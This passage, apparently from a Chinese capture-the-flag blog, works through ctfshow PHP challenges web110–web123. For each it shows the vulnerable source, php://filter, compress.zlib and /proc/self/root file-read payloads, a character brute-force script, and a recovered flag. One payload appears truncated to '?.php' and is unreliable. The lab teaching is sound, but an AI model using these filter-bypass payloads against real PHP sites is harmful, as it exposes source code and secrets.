&lt;li&gt;迭代时不会像 &lt;code&gt;readdir()&lt;/code&gt; 那样需要手动 &lt;code&gt;opendir()&lt;/code&gt; &amp;#x2F; &lt;code&gt;closedir()&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;getcwd()&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;全称&lt;/strong&gt;：**&lt;code&gt;get current working directory&lt;/code&gt;**&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;作用&lt;/strong&gt;：返回当前脚本执行时的工作目录（&lt;code&gt;Working Directory&lt;/code&gt;）。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;语法&lt;/strong&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;echo getcwd();
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;这是执行时的目录，不一定是文件所在的目录，因为 PHP 运行时的“工作目录”可能被 &lt;code&gt;chdir()&lt;/code&gt; 改过。&lt;/li&gt;
&lt;li&gt;常配合 &lt;code&gt;chdir()&lt;/code&gt; 使用，改变脚本执行路径。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;payload&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?v1=FilesystemIterator&amp;amp;v2=getcwd
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250808232000484.png&#34; alt=&#34;image-20250808232000484&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;访问 &lt;code&gt;靶机/fl36dga.txt&lt;/code&gt; 拿到flag&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250808232042079.png&#34; alt=&#34;image-20250808232042079&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web111&#34;&gt;&lt;a href=&#34;#web111&#34; class=&#34;headerlink&#34; title=&#34;web111&#34;&gt;&lt;/a&gt;web111&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-30 02:41:40

*/

highlight_file(__FILE__);
error_reporting(0);
include(&amp;quot;flag.php&amp;quot;);

function getFlag(&amp;amp;$v1,&amp;amp;$v2)&amp;#123;
    eval(&amp;quot;$$v1 = &amp;amp;$$v2;&amp;quot;);
    var_dump($$v1);
&amp;#125;


if(isset($_GET[&amp;#39;v1&amp;#39;]) &amp;amp;&amp;amp; isset($_GET[&amp;#39;v2&amp;#39;]))&amp;#123;
    $v1 = $_GET[&amp;#39;v1&amp;#39;];
    $v2 = $_GET[&amp;#39;v2&amp;#39;];

    if(preg_match(&amp;#39;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;amp;|\*|\(|\)|\_|\-|\+|\=|\&amp;#123;|\[|\;|\:|\&amp;quot;|\&amp;#39;|\,|\.|\?|\\\\|\/|[0-9]|\&amp;lt;|\&amp;gt;/&amp;#39;, $v1))&amp;#123;
            die(&amp;quot;error v1&amp;quot;);
    &amp;#125;
    if(preg_match(&amp;#39;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;amp;|\*|\(|\)|\_|\-|\+|\=|\&amp;#123;|\[|\;|\:|\&amp;quot;|\&amp;#39;|\,|\.|\?|\\\\|\/|[0-9]|\&amp;lt;|\&amp;gt;/&amp;#39;, $v2))&amp;#123;
            die(&amp;quot;error v2&amp;quot;);
    &amp;#125;

    if(preg_match(&amp;#39;/ctfshow/&amp;#39;, $v1))&amp;#123;
            getFlag($v1,$v2);
    &amp;#125;





&amp;#125;

?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;$GLOBALS&lt;/code&gt; — 引用全局作用域中可用的全部变量 一个包含了全部变量的全局组合数组。变量的名字就是数组的键。&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?v1=ctfshow&amp;amp;v2=GLOBALS
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250808234543689.png&#34; alt=&#34;image-20250808234543689&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web112&#34;&gt;&lt;a href=&#34;#web112&#34; class=&#34;headerlink&#34; title=&#34;web112&#34;&gt;&lt;/a&gt;web112&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-30 23:47:49

*/

highlight_file(__FILE__);
error_reporting(0);
function filter($file)&amp;#123;
    if(preg_match(&amp;#39;/\.\.\/|http|https|data|input|rot13|base64|string/i&amp;#39;,$file))&amp;#123;
        die(&amp;quot;hacker!&amp;quot;);
    &amp;#125;else&amp;#123;
        return $file;
    &amp;#125;
&amp;#125;
$file=$_GET[&amp;#39;file&amp;#39;];
if(! is_file($file))&amp;#123;
    highlight_file(filter($file));
&amp;#125;else&amp;#123;
    echo &amp;quot;hacker!&amp;quot;;
&amp;#125;
&amp;lt;?php
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;compress.zlib://&lt;/code&gt;&lt;/strong&gt; &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;它是 PHP 提供的一种 &lt;strong&gt;流包装器（stream wrapper）&lt;/strong&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;专门用来&lt;strong&gt;读取或写入 &lt;code&gt;gzip/zlib&lt;/code&gt; 压缩过的文件&lt;/strong&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;用它打开文件时，PHP 会&lt;strong&gt;自动解压&lt;/strong&gt;（读取时）或&lt;strong&gt;自动压缩&lt;/strong&gt;（写入时）。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;如果 &lt;code&gt;flag.php&lt;/code&gt; 根本没压缩，PHP 依然会尝试按 &lt;code&gt;gzip/zlib&lt;/code&gt; 方式解压；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;如果内容不符合压缩格式，就会报错或者输出乱码&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;php://filter/read=convert.quoted-printable-encode/resource&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;用 PHP 的 &lt;code&gt;php://filter&lt;/code&gt; 流包装器，在读取 &lt;code&gt;flag.php&lt;/code&gt; 时，先用 &lt;code&gt;quoted-printable&lt;/code&gt; 编码过滤器处理，再返回结果&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;convert.quoted-printable-encode&lt;/code&gt; 是 PHP 自带的一个转码过滤器，会把内容转成 &lt;strong&gt;&lt;code&gt;quoted-printable&lt;/code&gt;&lt;/strong&gt; 格式（常见于电子邮件传输）。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;用 PHP 的流过滤器把 &lt;code&gt;flag.php&lt;/code&gt; 从 UTF-8 编码转换成 UTF-16LE 编码后再读出来。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;convert.iconv.&amp;lt;源编码&amp;gt;.&amp;lt;目标编码&amp;gt;&lt;/code&gt;：用 &lt;code&gt;iconv&lt;/code&gt; 做字符编码转换。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;源编码：&lt;code&gt;utf-8&lt;/code&gt;（假设 &lt;code&gt;flag.php&lt;/code&gt; 原本是 UTF-8 编码）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;目标编码：&lt;code&gt;utf-16le&lt;/code&gt;（UTF-16 小端序）&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;payload&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?file=php://filter/resource=flag.php

# 读取压缩流
?file=compress.zlib://flag.php

# 未过滤的编码方式和转换方式
?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php

?file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php

?file=php://filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;对于 &lt;code&gt;?file=php://filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php&lt;/code&gt; 产生的flag &lt;code&gt;f$al=gc&amp;quot;fthswod&amp;#123;168fc8-2d5e14-7e-6782bb-6a2ffc4c16&amp;#125;6;&amp;quot;&lt;/code&gt; ，其中含有特殊字符，还原时需要加上转义符&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
#有特殊符号，需要加上转义符
$flag=&amp;quot;f\$al=gc\&amp;quot;fthswod&amp;#123;168fc8-2d5e14-7e-6782bb-6a2ffc4c16&amp;#125;6;\&amp;quot;&amp;quot;;
$result=iconv(&amp;quot;UCS-2BE&amp;quot;,&amp;quot;UCS-2LE&amp;quot;,$flag);
echo  &amp;quot;flag:&amp;quot;.$result.&amp;quot;\n&amp;quot;;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250811151110690.png&#34; alt=&#34;image-20250811151110690&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web113&#34;&gt;&lt;a href=&#34;#web113&#34; class=&#34;headerlink&#34; title=&#34;web113&#34;&gt;&lt;/a&gt;web113&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-30 23:47:52

*/

highlight_file(__FILE__);
error_reporting(0);
function filter($file)&amp;#123;
    if(preg_match(&amp;#39;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&amp;#39;,$file))&amp;#123;
        die(&amp;#39;hacker!&amp;#39;);
    &amp;#125;else&amp;#123;
        return $file;
    &amp;#125;
&amp;#125;
$file=$_GET[&amp;#39;file&amp;#39;];
if(! is_file($file))&amp;#123;
    highlight_file(filter($file));
&amp;#125;else&amp;#123;
    echo &amp;quot;hacker!&amp;quot;;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?file=compress.zlib://flag.php
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250811153913537.png&#34; alt=&#34;image-20250811153913537&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;/proc&lt;/code&gt;&lt;/strong&gt; &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/proc&lt;/code&gt; 是 Linux 系统里的一个 &lt;strong&gt;虚拟文件系统&lt;/strong&gt;，里面的内容并不是普通文件，而是内存中动态生成的系统和进程信息。&lt;/li&gt;
&lt;li&gt;可以把它想象成 Linux 内核给你开了一个“状态窗口”，告诉你当前系统和各个程序的运行状态。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;/proc/self&lt;/code&gt;&lt;/strong&gt; &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/proc/self&lt;/code&gt; 是一个&lt;strong&gt;特殊的目录链接&lt;/strong&gt;，它&lt;strong&gt;总是指向当前访问它的进程自己的 &lt;code&gt;/proc/[pid]&lt;/code&gt; 目录&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;换句话说：&lt;ul&gt;
&lt;li&gt;当进程 A 访问 &lt;code&gt;/proc/self&lt;/code&gt;，它看到的是 &lt;code&gt;/proc/A的PID&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;当进程 B 访问 &lt;code&gt;/proc/self&lt;/code&gt;，它看到的是 &lt;code&gt;/proc/B的PID&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这是 Linux 里的“自指”机制。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;?.php&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;原理&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/proc/self/&lt;/code&gt; 代表&lt;strong&gt;当前进程&lt;/strong&gt;的 &lt;code&gt;/proc&lt;/code&gt; 目录。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/proc/self/root&lt;/code&gt; 指向**当前进程的根目录 &lt;code&gt;/&lt;/code&gt;**（类似 chroot 后的 &lt;code&gt;/&lt;/code&gt;）。&lt;/li&gt;
&lt;li&gt;你访问 &lt;code&gt;/proc/self/root/var/www/html/flag.php&lt;/code&gt;，等价于直接访问 &lt;code&gt;/var/www/html/flag.php&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;多层 &lt;code&gt;/proc/self/root&lt;/code&gt; 嵌套，通过“路径套娃”来绕过一些 &lt;strong&gt;路径检测&amp;#x2F;正则过滤&lt;/strong&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?.php
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250811160608515.png&#34; alt=&#34;image-20250811160608515&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web114&#34;&gt;&lt;a href=&#34;#web114&#34; class=&#34;headerlink&#34; title=&#34;web114&#34;&gt;&lt;/a&gt;web114&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-01 15:02:53

*/

error_reporting(0);
highlight_file(__FILE__);
function filter($file)&amp;#123;
    if(preg_match(&amp;#39;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&amp;#39;,$file))&amp;#123;
        die(&amp;#39;hacker!&amp;#39;);
    &amp;#125;else&amp;#123;
        return $file;
    &amp;#125;
&amp;#125;
$file=$_GET[&amp;#39;file&amp;#39;];
echo &amp;quot;师傅们居然tql都是非预期 哼！&amp;quot;;
if(! is_file($file))&amp;#123;
    highlight_file(filter($file));
&amp;#125;else&amp;#123;
    echo &amp;quot;hacker!&amp;quot;;
&amp;#125; 师傅们居然tql都是非预期 哼！
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?file=php://filter/resource=flag.php
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250811163344092.png&#34; alt=&#34;image-20250811163344092&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web115&#34;&gt;&lt;a href=&#34;#web115&#34; class=&#34;headerlink&#34; title=&#34;web115&#34;&gt;&lt;/a&gt;web115&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-01 15:08:19

*/

include(&amp;#39;flag.php&amp;#39;);
highlight_file(__FILE__);
error_reporting(0);
function filter($num)&amp;#123;
    $num=str_replace(&amp;quot;0x&amp;quot;,&amp;quot;1&amp;quot;,$num);
    $num=str_replace(&amp;quot;0&amp;quot;,&amp;quot;1&amp;quot;,$num);
    $num=str_replace(&amp;quot;.&amp;quot;,&amp;quot;1&amp;quot;,$num);
    $num=str_replace(&amp;quot;e&amp;quot;,&amp;quot;1&amp;quot;,$num);
    $num=str_replace(&amp;quot;+&amp;quot;,&amp;quot;1&amp;quot;,$num);
    return $num;
&amp;#125;
$num=$_GET[&amp;#39;num&amp;#39;];
if(is_numeric($num) and $num!==&amp;#39;36&amp;#39; and trim($num)!==&amp;#39;36&amp;#39; and filter($num)==&amp;#39;36&amp;#39;)&amp;#123;
    if($num==&amp;#39;36&amp;#39;)&amp;#123;
        echo $flag;
    &amp;#125;else&amp;#123;
        echo &amp;quot;hacker!!&amp;quot;;
    &amp;#125;
&amp;#125;else&amp;#123;
    echo &amp;quot;hacker!!!&amp;quot;;
&amp;#125; hacker!!!
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;过滤了八进制、十六进制、科学计数等&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;trim&lt;/code&gt; 函数&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;trim&lt;/code&gt; 函数作用&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;trim&lt;/code&gt; 用于 &lt;strong&gt;去除字符串两端的空白字符&lt;/strong&gt; 或者指定字符集合。&lt;/p&gt;
&lt;p&gt;其&lt;strong&gt;默认行为&lt;/strong&gt;是去除以下字符（空白字符）：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;quot; &amp;quot;&lt;/code&gt; （ASCII 32，空格）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;quot;\t&amp;quot;&lt;/code&gt;（ASCII 9，水平制表符）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;quot;\n&amp;quot;&lt;/code&gt;（ASCII 10，换行符）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;quot;\r&amp;quot;&lt;/code&gt;（ASCII 13，回车符）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;quot;\0&amp;quot;&lt;/code&gt;（ASCII 0，NULL字节）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;quot;\x0B&amp;quot;&lt;/code&gt;（ASCII 11，垂直制表符）&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;strong&gt;语法&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;string trim ( string $str [, string $character_mask = &amp;quot; \t\n\r\0\x0B&amp;quot; ] )
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;$str&lt;/code&gt;：要处理的字符串；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$character_mask&lt;/code&gt;（可选）：指定要去除的字符集合，默认是上面提到的所有空白字符。&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;&lt;strong&gt;行为举例&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;$str = &amp;quot;  \t\n Hello World! \r\n  &amp;quot;;
echo trim($str);  
// 输出 &amp;quot;Hello World!&amp;quot;，两端的空白字符被去除
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果你指定字符：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;$str = &amp;quot;abcHello World!cba&amp;quot;;
echo trim($str, &amp;quot;abc&amp;quot;);  
// 输出 &amp;quot;Hello World!&amp;quot;
// 因为两端的a,b,c都被去掉了
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;爆破出可以利用的字符&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
for($i = 0; $i&amp;lt;129; $i++)&amp;#123;
    $num=chr($i).&amp;#39;36&amp;#39;;
    if(trim($num)!==&amp;#39;36&amp;#39; &amp;amp;&amp;amp; is_numeric($num) &amp;amp;&amp;amp; $num!==&amp;#39;36&amp;#39;)&amp;#123;
        echo urlencode(chr($i)).&amp;quot;\n&amp;quot;;
    &amp;#125;
&amp;#125;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;得到 &lt;code&gt;%0C&lt;/code&gt; (换页符) 符合条件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;payload&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?num=%0C36
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250811171202249.png&#34; alt=&#34;image-20250811171202249&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web123&#34;&gt;&lt;a href=&#34;#web123&#34; class=&#34;headerlink&#34; title=&#34;web123&#34;&gt;&lt;/a&gt;web123&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/
error_reporting(0);
highlight_file(__FILE__);
include(&amp;quot;flag.php&amp;quot;);
$a=$_SERVER[&amp;#39;argv&amp;#39;];
$c=$_POST[&amp;#39;fun&amp;#39;];
if(isset($_POST[&amp;#39;CTF_SHOW&amp;#39;])&amp;amp;&amp;amp;isset($_POST[&amp;#39;CTF_SHOW.COM&amp;#39;])&amp;amp;&amp;amp;!isset($_GET[&amp;#39;fl0g&amp;#39;]))&amp;#123;
    if(!preg_match(&amp;quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&amp;#123;|\&amp;#125;|\&amp;quot;|\&amp;#39;|\,|\.|\;|\?/&amp;quot;, $c)&amp;amp;&amp;amp;$c&amp;lt;=18)&amp;#123;
         eval(&amp;quot;$c&amp;quot;.&amp;quot;;&amp;quot;);  
         if($fl0g===&amp;quot;flag_give_me&amp;quot;)&amp;#123;
             echo $flag;
         &amp;#125;
    &amp;#125;
&amp;#125;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;$_SERVER&lt;/code&gt; 是 PHP 的一个超级全局变量（超级全局数组），它包含了服务器和执行环境的信息（注意：是数组）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;一、PHP变量名&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;PHP变量名限制&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;PHP 变量名的规则是：只能由字母、数字、下划线组成，且不能以数字开头。&lt;/li&gt;
&lt;li&gt;比如：&lt;code&gt;$var1&lt;/code&gt;, &lt;code&gt;$my_var&lt;/code&gt;, &lt;code&gt;$a123&lt;/code&gt; 是合法的变量名。&lt;/li&gt;
&lt;li&gt;变量名中不允许直接有点号（&lt;code&gt;.&lt;/code&gt;）、空格、&lt;code&gt;+&lt;/code&gt; 等特殊字符。&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;strong&gt;GET&amp;#x2F;POST传入参数映射到变量名时的自动替换&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;当你通过 URL 或 POST 请求传参时，比如：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?my var=123
?my+var=123
?my.var=123
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;PHP 会自动把请求参数的键名中的以下字符：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;空格 (&lt;code&gt; &lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;加号 (&lt;code&gt;+&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;点号 (&lt;code&gt;.&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;左中括号 (&lt;code&gt;[&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;替换成 &lt;strong&gt;下划线 &lt;code&gt;_&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;&lt;strong&gt;PHP变量名“绕过”特性：&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;当变量名中出现了中括号 &lt;code&gt;[ &lt;/code&gt;，PHP 会把左中括号 &lt;code&gt;[&lt;/code&gt; 替换成 &lt;code&gt;_&lt;/code&gt;，但中括号后面的部分&lt;strong&gt;不再被替换&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;因此，像 &lt;code&gt;CTF[SHOW.COM&lt;/code&gt;，会被解析为：&lt;/li&gt;
&lt;li&gt;参数名变为：&lt;code&gt;CTF_SHOW.COM&lt;/code&gt;（&lt;code&gt;[&lt;/code&gt; → &lt;code&gt;_&lt;/code&gt; 替换）&lt;/li&gt;
&lt;li&gt;后面的 &lt;code&gt;SHOW.COM&lt;/code&gt; 保留原样（&lt;code&gt;.&lt;/code&gt; 不替换）&lt;/li&gt;
&lt;li&gt;所以 &lt;code&gt;$_GET&lt;/code&gt; 中的键是 &lt;code&gt;CTF_SHOW.COM&lt;/code&gt;，这就是“变量名出现&lt;code&gt;.&lt;/code&gt;”的情况。&lt;/li&gt;
&lt;li&gt;此外，&lt;code&gt;空格&lt;/code&gt; 、&lt;code&gt;+&lt;/code&gt;  、&lt;code&gt;.&lt;/code&gt; 也会转成 &lt;code&gt;_&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;二、&lt;code&gt;argv&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;argv&lt;/code&gt; 含义&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;在 PHP 里，如果你用 &lt;strong&gt;命令行模式&lt;/strong&gt;（CLI）运行：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;php test.php a b c
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;那么：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;print_r($_SERVER[&amp;#39;argv&amp;#39;]);
